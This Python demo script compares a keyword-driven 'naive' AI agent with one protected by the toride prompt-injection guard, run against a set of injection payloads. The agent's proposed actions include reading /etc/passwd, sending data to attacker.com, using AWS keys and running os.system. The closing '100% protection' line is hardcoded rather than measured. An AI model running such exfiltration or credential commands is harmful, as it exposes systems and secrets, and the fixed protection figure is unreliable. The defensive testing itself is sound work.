import os
import sys

# Ensure the core toride library is in path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from toride import AgentGuard, BlockedActionError, Decision, Source
from toride.fuzzer import INJECTION_PAYLOADS


def naive_agent_decide(prompt: str):
    """
    A naive agent parsing instructions. If it finds keywords like 'shell',
    'code', 'file', or 'credential', it decides to call corresponding tools.
    """
    actions = []
    prompt_lower = prompt.lower()

    # Direct instruction overrides or admin tags trigger actions
    if (
        "shell" in prompt_lower
        or "shell_exec" in prompt_lower
        or "command" in prompt_lower
        or "passwd" in prompt_lower
    ):
        actions.append({"type": "shell_exec", "payload": "cat /etc/passwd"})
    if "leak" in prompt_lower or "attacker" in prompt_lower or "send" in prompt_lower:
        actions.append({"type": "network_call", "payload": "http://attacker.com/leak"})
    if (
        "credential_use" in prompt_lower
        or "api_key" in prompt_lower
        or "mandatory" in prompt_lower
    ):
        actions.append({"type": "credential_use", "payload": "AWS_ACCESS_KEY_ID"})
    if "code_exec" in prompt_lower or "os.system" in prompt_lower:
        actions.append({"type": "code_exec", "payload": "import os; os.system('id')"})

    return actions


def main():
    print("======================================================================")
    print("       TORIDE SECURITY DEMO: VULNERABLE VS GUARDED AI AGENTS          ")
    print("======================================================================\n")

    # Part 1: Naive Agent
    print("[*] Running Fuzz Payloads against NAIVE agent (no guardrails)...")
    naive_hijacked = 0
    naive_executed = 0

    for idx, item in enumerate(INJECTION_PAYLOADS):
        name = item["name"]
        payload = item["payload"]

        actions = naive_agent_decide(payload)
        if actions:
            print(f"  [!] Payload #{idx + 1} ({name}) HIJACKED the naive agent!")
            print(f"      Proposed actions: {actions}")
            naive_hijacked += 1
            naive_executed += len(actions)
        else:
            print(f"  [+] Payload #{idx + 1} ({name}) failed to hijack.")

    print(
        f"\n[SUMMARY] Naive Agent Hijack Rate: {naive_hijacked}/{len(INJECTION_PAYLOADS)} (Total executed actions: {naive_executed})"
    )
    print("-" * 76 + "\n")

    # Part 2: Guarded Agent
    print("[*] Running Fuzz Payloads against GUARDED agent (using Toride)...")
    guarded_blocked = 0
    guarded_approved = 0
    guarded_executed = 0

    # Initialize the Toride AgentGuard
    guard = AgentGuard()

    for idx, item in enumerate(INJECTION_PAYLOADS):
        name = item["name"]
        payload = item["payload"]

        # We assume the prompt payload comes from an untrusted source (WEB_FETCH / EMAIL)
        # Note: If it came from USER (trust 100), rules might allow it. But from WEB_FETCH (trust 0),
        # it is flagged and blocked/approval-gated.
        tagged = guard.ingest(content=payload, source=Source.WEB_FETCH)

        proposed_actions = naive_agent_decide(payload)

        for action in proposed_actions:
            try:
                decision = guard.check_action(
                    action_type=action["type"],
                    payload=action["payload"],
                    source_content_ids=[tagged.id],
                )

                if decision == Decision.ALLOW:
                    print(f"  [+] Allowed action '{action['type']}'")
                    guarded_executed += 1
                elif decision == Decision.REQUIRE_APPROVAL:
                    print(
                        f"  [⚠️] Approval required for '{action['type']}' (Taint Score: {tagged.trust_score})"
                    )
                    guarded_approved += 1
            except BlockedActionError as e:
                print(f"  [🛡️] Blocked action '{action['type']}'! Reason: {e}")
                guarded_blocked += 1

    print("\n[SUMMARY] Guarded Agent Stats:")
    print(f"  - Blocked Actions:          {guarded_blocked}")
    print(f"  - Require Approval:        {guarded_approved}")
    print(f"  - Executed Risky Actions:   {guarded_executed}")
    print(
        f"  - Hijack Success Rate:      0/{len(INJECTION_PAYLOADS)} (100% protection)"
    )
    print("======================================================================")


if __name__ == "__main__":
    main()
